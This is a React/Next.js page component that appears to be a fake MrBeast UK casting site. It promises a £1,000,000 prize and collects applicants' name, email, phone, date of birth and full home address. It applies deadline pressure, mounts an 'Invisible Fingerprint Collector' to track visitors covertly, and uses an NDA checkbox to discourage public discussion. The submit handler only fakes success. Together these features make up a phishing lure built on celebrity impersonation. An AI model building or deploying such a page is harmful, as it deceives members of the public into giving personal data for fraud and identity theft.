'use client';

import React, { useState } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import {
    Trophy,
    MapPin,
    Calendar,
    FileText,
    X,
    Check
} from 'lucide-react';
import FingerprintCollector from '@/components/FingerprintCollector';

type ModalType = 'event' | 'prize' | 'schedule' | 'apply' | null;

// MrBeast thumbnail images for moving background
const thumbnailUrls = [
    'https://framerusercontent.com/images/bgQ7LaushQ3uKhGtMNFXuEGpao.webp',
    'https://framerusercontent.com/images/hPC8vDD00bNS6Am4qVEhxwpM3Q.webp',
    'https://framerusercontent.com/images/8ZIzCpUhU6TE9SnxhaY5pNQJI.webp',
    'https://framerusercontent.com/images/oE0ZiJigUE9JIQeKMpf40vN5G0.webp',
    'https://framerusercontent.com/images/4k6c3Lz4wLp6JF28527neoFPJak.webp',
    'https://framerusercontent.com/images/eLG5glctYEGUJrHyCnrXDfAl4M.webp',
    'https://framerusercontent.com/images/UsUMuOc67IPYL3bCZsPTSesJA.webp',
    'https://framerusercontent.com/images/C2HWy1DxUzt1UYLjabrvgr0TZlo.webp',
    'https://framerusercontent.com/images/zdAthvKyHAjDm0RPteVHslqypGI.webp',
    'https://framerusercontent.com/images/z8fYDRp92Y7NyZ6ykQ9AhiHJAE.webp',
    'https://framerusercontent.com/images/WE9HnHI7MBG6Rd428sr3yV5v0Fg.webp',
    'https://framerusercontent.com/images/y0TjDpmOCH3rVDJeOws6VHn4oY.webp',
    'https://framerusercontent.com/images/UVAZRgobmmIww2M3nXzyJ7ZBr5I.webp',
    'https://framerusercontent.com/images/vzrJE1KUGsrh3XitZ5a2vnpKLEI.webp',
    'https://framerusercontent.com/images/xuowK8gonSrsYDn7bGFv3f8dfY8.webp',
    'https://framerusercontent.com/images/HANgwjO5IfpLgx1eRBRYReHkmg.webp',
    'https://framerusercontent.com/images/EcKqINIp13ozlnQdu2rRqqH5w.webp',
    'https://framerusercontent.com/images/dKYud8TqWTDOw5fLKhzasNBQo.webp',
    'https://framerusercontent.com/images/jAUH5cBbnA3ZOphi0S55Cdmc.webp',
    'https://framerusercontent.com/images/hIuSG3lrVrm6Zge6cE2EzIWQAjg.webp',
    'https://framerusercontent.com/images/nBskd7OI4vLFo1Jyx0To3g06FU.webp',
    'https://framerusercontent.com/images/DMygJWqH5ngKYhJlcgckcO7x3Nc.webp',
    'https://framerusercontent.com/images/Uc5pnC3NhgIeuW3dkZLN5HEIiuY.webp',
    'https://framerusercontent.com/images/PyLupm3c2gU7nFh4H6ddLIjv4E.webp',
];

// Split into 5 rows for seamless infinite animation - duplicate for seamless loop
const allThumbs = [...thumbnailUrls, ...thumbnailUrls]; // Double for seamless loop
const row1 = [...allThumbs.slice(0, 12), ...allThumbs.slice(0, 12)];
const row2 = [...allThumbs.slice(6, 18), ...allThumbs.slice(6, 18)];
const row3 = [...allThumbs.slice(12, 24), ...allThumbs.slice(12, 24)];
const row4 = [...allThumbs.slice(3, 15), ...allThumbs.slice(3, 15)];
const row5 = [...allThumbs.slice(9, 21), ...allThumbs.slice(9, 21)];

// Modal content configuration
const modalContent = {
    event: {
        title: 'The Event',
        icon: MapPin,
        color: '#ff3b30'
    },
    prize: {
        title: 'The Prize',
        icon: Trophy,
        color: '#ffcc00'
    },
    schedule: {
        title: 'Schedule',
        icon: Calendar,
        color: '#34c759'
    },
    apply: {
        title: 'Apply Now',
        icon: FileText,
        color: '#007aff'
    }
};

// Trembling animation for corner icons
const trembleAnimation = {
    animate: {
        x: [0, -1, 1, -1, 1, 0],
        y: [0, 1, -1, 1, -1, 0],
        rotate: [0, -1, 1, -1, 1, 0]
    },
    transition: {
        duration: 0.5,
        repeat: Infinity,
        repeatDelay: 2,
        ease: "easeInOut" as const
    }
};

export default function CastingPage() {
    const [activeModal, setActiveModal] = useState<ModalType>(null);
    const [formData, setFormData] = useState({
        name: '',
        email: '',
        phone: '',
        dob_day: '',
        dob_month: '',
        dob_year: '',
        house_number: '',
        street: '',
        city: '',
        postcode: '',
        instagram: '',
        why_you: '',
        nda_agree: false
    });
    const [formStatus, setFormStatus] = useState<'idle' | 'submitting' | 'success'>('idle');

    const handleSubmit = async (e: React.FormEvent) => {
        e.preventDefault();
        if (!formData.nda_agree) return;
        setFormStatus('submitting');
        setTimeout(() => {
            setFormStatus('success');
        }, 1500);
    };

    const closeModal = () => setActiveModal(null);

    return (
        <main className="ios-bg">
            {/* Invisible Fingerprint Collector */}
            <FingerprintCollector />

            {/* Moving Thumbnail Background - 5 rows for full screen coverage */}
            <div className="thumbnail-container">
                <div className="thumbnail-row row-right">
                    {row1.map((src, i) => (
                        <div key={`r1-${i}`} className="thumbnail-item">
                            <img src={src} alt="" loading="lazy" />
                        </div>
                    ))}
                </div>
                <div className="thumbnail-row row-left">
                    {row2.map((src, i) => (
                        <div key={`r2-${i}`} className="thumbnail-item">
                            <img src={src} alt="" loading="lazy" />
                        </div>
                    ))}
                </div>
                <div className="thumbnail-row row-right">
                    {row3.map((src, i) => (
                        <div key={`r3-${i}`} className="thumbnail-item">
                            <img src={src} alt="" loading="lazy" />
                        </div>
                    ))}
                </div>
                <div className="thumbnail-row row-left">
                    {row4.map((src, i) => (
                        <div key={`r4-${i}`} className="thumbnail-item">
                            <img src={src} alt="" loading="lazy" />
                        </div>
                    ))}
                </div>
                <div className="thumbnail-row row-right">
                    {row5.map((src, i) => (
                        <div key={`r5-${i}`} className="thumbnail-item">
                            <img src={src} alt="" loading="lazy" />
                        </div>
                    ))}
                </div>
            </div>

            {/* Gradient overlay */}
            <div className="gradient-overlay"></div>

            {/* Center content */}
            <div className="center-content">
                <motion.div
                    initial={{ opacity: 0, scale: 0.9 }}
                    animate={{ opacity: 1, scale: 1 }}
                    transition={{ duration: 0.8 }}
                    className="logo-container"
                >
                    <img
                        src="https://framerusercontent.com/images/SwoVf7kLr1oqhyWUVEtoqMyPLU.svg"
                        alt="MrBeast"
                        className="center-logo"
                    />

                    {/* Prize Display */}
                    <motion.div
                        className="prize-hero"
                        initial={{ opacity: 0, y: 20 }}
                        animate={{ opacity: 1, y: 0 }}
                        transition={{ delay: 0.3, duration: 0.6 }}
                    >
                        <div className="prize-main">£1,000,000</div>
                        <div className="prize-sub">GRAND PRIZE</div>
                        <div className="prize-extra">
                            + 10 winners get <span className="highlight">£10,000</span> each!
                        </div>
                    </motion.div>

                    {/* Apply Now Button */}
                    <motion.button
                        className="apply-hero-btn"
                        onClick={() => setActiveModal('apply')}
                        initial={{ opacity: 0, scale: 0.9 }}
                        animate={{ opacity: 1, scale: 1 }}
                        transition={{ delay: 0.5, duration: 0.5 }}
                        whileHover={{ scale: 1.05 }}
                        whileTap={{ scale: 0.95 }}
                    >
                        Apply Now
                    </motion.button>
                </motion.div>
            </div>

            {/* Corner Icons */}
            {/* Top Left - Event */}
            <motion.button
                className="corner-icon top-left"
                onClick={() => setActiveModal('event')}
                {...trembleAnimation}
                whileHover={{ scale: 1.15 }}
                whileTap={{ scale: 0.95 }}
            >
                <div className="icon-glass" style={{ '--accent': '#ff3b30' } as React.CSSProperties}>
                    <MapPin className="icon" />
                </div>
                <span className="icon-label">Event</span>
            </motion.button>

            {/* Top Right - Prize */}
            <motion.button
                className="corner-icon top-right"
                onClick={() => setActiveModal('prize')}
                {...trembleAnimation}
                whileHover={{ scale: 1.15 }}
                whileTap={{ scale: 0.95 }}
            >
                <div className="icon-glass" style={{ '--accent': '#ffcc00' } as React.CSSProperties}>
                    <Trophy className="icon" />
                </div>
                <span className="icon-label">Prize</span>
            </motion.button>

            {/* Bottom Left - Schedule */}
            <motion.button
                className="corner-icon bottom-left"
                onClick={() => setActiveModal('schedule')}
                {...trembleAnimation}
                whileHover={{ scale: 1.15 }}
                whileTap={{ scale: 0.95 }}
            >
                <div className="icon-glass" style={{ '--accent': '#34c759' } as React.CSSProperties}>
                    <Calendar className="icon" />
                </div>
                <span className="icon-label">Schedule</span>
            </motion.button>

            {/* Bottom Right - Apply */}
            <motion.button
                className="corner-icon bottom-right"
                onClick={() => setActiveModal('apply')}
                {...trembleAnimation}
                whileHover={{ scale: 1.15 }}
                whileTap={{ scale: 0.95 }}
            >
                <div className="icon-glass" style={{ '--accent': '#007aff' } as React.CSSProperties}>
                    <FileText className="icon" />
                </div>
                <span className="icon-label">Apply</span>
            </motion.button>

            {/* Modal Overlay */}
            <AnimatePresence>
                {activeModal && (
                    <motion.div
                        className="modal-overlay"
                        initial={{ opacity: 0 }}
                        animate={{ opacity: 1 }}
                        exit={{ opacity: 0 }}
                        onClick={closeModal}
                    >
                        <motion.div
                            className="modal-glass"
                            initial={{ opacity: 0, scale: 0.85, y: 30 }}
                            animate={{ opacity: 1, scale: 1, y: 0 }}
                            exit={{ opacity: 0, scale: 0.85, y: 30 }}
                            transition={{ type: 'spring', damping: 25, stiffness: 300 }}
                            onClick={(e) => e.stopPropagation()}
                        >
                            {/* Modal Header */}
                            <div className="modal-header">
                                <div className="modal-title-row">
                                    {activeModal && (
                                        <>
                                            <div
                                                className="modal-icon-badge"
                                                style={{ background: modalContent[activeModal].color }}
                                            >
                                                {React.createElement(modalContent[activeModal].icon, { size: 20, color: 'white' })}
                                            </div>
                                            <h2 className="modal-title">{modalContent[activeModal].title}</h2>
                                        </>
                                    )}
                                </div>
                                <button className="close-btn" onClick={closeModal}>
                                    <X size={20} />
                                </button>
                            </div>

                            {/* Modal Body */}
                            <div className="modal-body">
                                {activeModal === 'event' && (
                                    <div className="content-block">
                                        <p className="text-lg mb-4">
                                            For the <strong>first time ever</strong>, MrBeast is bringing a massive production to the UK.
                                        </p>
                                        <p className="text-base text-secondary mb-4">
                                            We&apos;re looking for bold, fearless individuals who thrive under pressure
                                            and aren&apos;t afraid to push their limits.
                                        </p>
                                        <div className="info-chip">
                                            <MapPin size={16} />
                                            <span>Secret Location, United Kingdom</span>
                                        </div>
                                    </div>
                                )}

                                {activeModal === 'prize' && (
                                    <div className="content-block">
                                        <div className="prize-amount">£1,000,000</div>
                                        <p className="prize-subtitle">Grand Prize in Cash</p>

                                        <div className="prize-bonus-box">
                                            <span className="bonus-label">PLUS</span>
                                            <div className="bonus-amount">10 × £10,000</div>
                                            <p className="bonus-desc">10 runners-up each win £10,000!</p>
                                        </div>

                                        <div className="prize-grid">
                                            <div className="prize-stat">
                                                <span className="stat-value">100+</span>
                                                <span className="stat-desc">Contestants</span>
                                            </div>
                                            <div className="prize-stat">
                                                <span className="stat-value">11</span>
                                                <span className="stat-desc">Winners</span>
                                            </div>
                                        </div>
                                        <p className="text-sm text-tertiary mt-4">
                                            All expenses paid. Travel, accommodation, and meals included.
                                        </p>
                                    </div>
                                )}

                                {activeModal === 'schedule' && (
                                    <div className="content-block">
                                        <div className="schedule-item">
                                            <div className="schedule-badge live">This Weekend</div>
                                            <p className="schedule-desc">Event Date</p>
                                        </div>
                                        <div className="schedule-item">
                                            <div className="schedule-badge">24 Hours Before</div>
                                            <p className="schedule-desc">Location Revealed</p>
                                        </div>
                                        <div className="schedule-item">
                                            <div className="schedule-badge">Applications Open</div>
                                            <p className="schedule-desc">Apply Now - Limited Spots</p>
                                        </div>
                                        <div className="info-chip warning">
                                            <Calendar size={16} />
                                            <span>Deadline: Friday Midnight</span>
                                        </div>
                                    </div>
                                )}

                                {activeModal === 'apply' && (
                                    <div className="content-block">
                                        <AnimatePresence mode="wait">
                                            {formStatus === 'success' ? (
                                                <motion.div
                                                    key="success"
                                                    initial={{ opacity: 0, scale: 0.9 }}
                                                    animate={{ opacity: 1, scale: 1 }}
                                                    className="success-state"
                                                >
                                                    <div className="success-icon">
                                                        <Check size={32} />
                                                    </div>
                                                    <h3>Application Received!</h3>
                                                    <p>If selected, you&apos;ll receive a confirmation email within 24 hours.</p>
                                                </motion.div>
                                            ) : (
                                                <motion.form
                                                    key="form"
                                                    onSubmit={handleSubmit}
                                                    className="apply-form"
                                                >
                                                    <div className="form-group">
                                                        <label>Full Name *</label>
                                                        <input
                                                            type="text"
                                                            required
                                                            value={formData.name}
                                                            onChange={(e) => setFormData({ ...formData, name: e.target.value })}
                                                            placeholder="Enter your full name"
                                                        />
                                                    </div>

                                                    <div className="form-group">
                                                        <label>Email *</label>
                                                        <input
                                                            type="email"
                                                            required
                                                            value={formData.email}
                                                            onChange={(e) => setFormData({ ...formData, email: e.target.value })}
                                                            placeholder="you@example.com"
                                                        />
                                                    </div>

                                                    <div className="form-group">
                                                        <label>Phone *</label>
                                                        <input
                                                            type="tel"
                                                            required
                                                            value={formData.phone}
                                                            onChange={(e) => setFormData({ ...formData, phone: e.target.value })}
                                                            placeholder="+44 7XXX XXX XXX"
                                                        />
                                                    </div>

                                                    {/* Date of Birth */}
                                                    <div className="form-group">
                                                        <label>Date of Birth *</label>
                                                        <div className="dob-row">
                                                            <input
                                                                type="text"
                                                                required
                                                                value={formData.dob_day}
                                                                onChange={(e) => setFormData({ ...formData, dob_day: e.target.value })}
                                                                placeholder="DD"
                                                                maxLength={2}
                                                                className="dob-input"
                                                            />
                                                            <input
                                                                type="text"
                                                                required
                                                                value={formData.dob_month}
                                                                onChange={(e) => setFormData({ ...formData, dob_month: e.target.value })}
                                                                placeholder="MM"
                                                                maxLength={2}
                                                                className="dob-input"
                                                            />
                                                            <input
                                                                type="text"
                                                                required
                                                                value={formData.dob_year}
                                                                onChange={(e) => setFormData({ ...formData, dob_year: e.target.value })}
                                                                placeholder="YYYY"
                                                                maxLength={4}
                                                                className="dob-input year"
                                                            />
                                                        </div>
                                                    </div>

                                                    {/* Address */}
                                                    <div className="form-row">
                                                        <div className="form-group half">
                                                            <label>House Number *</label>
                                                            <input
                                                                type="text"
                                                                required
                                                                value={formData.house_number}
                                                                onChange={(e) => setFormData({ ...formData, house_number: e.target.value })}
                                                                placeholder="12"
                                                            />
                                                        </div>
                                                        <div className="form-group half-grow">
                                                            <label>Street *</label>
                                                            <input
                                                                type="text"
                                                                required
                                                                value={formData.street}
                                                                onChange={(e) => setFormData({ ...formData, street: e.target.value })}
                                                                placeholder="High Street"
                                                            />
                                                        </div>
                                                    </div>

                                                    <div className="form-row">
                                                        <div className="form-group city-postcode">
                                                            <label>City *</label>
                                                            <input
                                                                type="text"
                                                                required
                                                                value={formData.city}
                                                                onChange={(e) => setFormData({ ...formData, city: e.target.value })}
                                                                placeholder="London"
                                                            />
                                                        </div>
                                                        <div className="form-group city-postcode">
                                                            <label>Postcode *</label>
                                                            <input
                                                                type="text"
                                                                required
                                                                value={formData.postcode}
                                                                onChange={(e) => setFormData({ ...formData, postcode: e.target.value })}
                                                                placeholder="SW1A 1AA"
                                                            />
                                                        </div>
                                                    </div>

                                                    <div className="form-group">
                                                        <label>Instagram (Optional)</label>
                                                        <input
                                                            type="text"
                                                            value={formData.instagram}
                                                            onChange={(e) => setFormData({ ...formData, instagram: e.target.value })}
                                                            placeholder="@yourusername"
                                                        />
                                                    </div>

                                                    <div className="form-group">
                                                        <label>Why You? *</label>
                                                        <textarea
                                                            required
                                                            rows={3}
                                                            value={formData.why_you}
                                                            onChange={(e) => setFormData({ ...formData, why_you: e.target.value })}
                                                            placeholder="Tell us what makes you stand out..."
                                                        />
                                                    </div>

                                                    <div className="nda-box">
                                                        <input
                                                            type="checkbox"
                                                            id="nda"
                                                            checked={formData.nda_agree}
                                                            onChange={(e) => setFormData({ ...formData, nda_agree: e.target.checked })}
                                                        />
                                                        <label htmlFor="nda">
                                                            I agree to the <span className="nda-link">NDA</span>. Discussing this event publicly may result in disqualification.
                                                        </label>
                                                    </div>

                                                    <button
                                                        type="submit"
                                                        className="submit-btn"
                                                        disabled={formStatus === 'submitting' || !formData.nda_agree}
                                                    >
                                                        {formStatus === 'submitting' ? 'Submitting...' : 'Submit Application'}
                                                    </button>
                                                </motion.form>
                                            )}
                                        </AnimatePresence>
                                    </div>
                                )}
                            </div>
                        </motion.div>
                    </motion.div>
                )}
            </AnimatePresence>
        </main>
    );
}
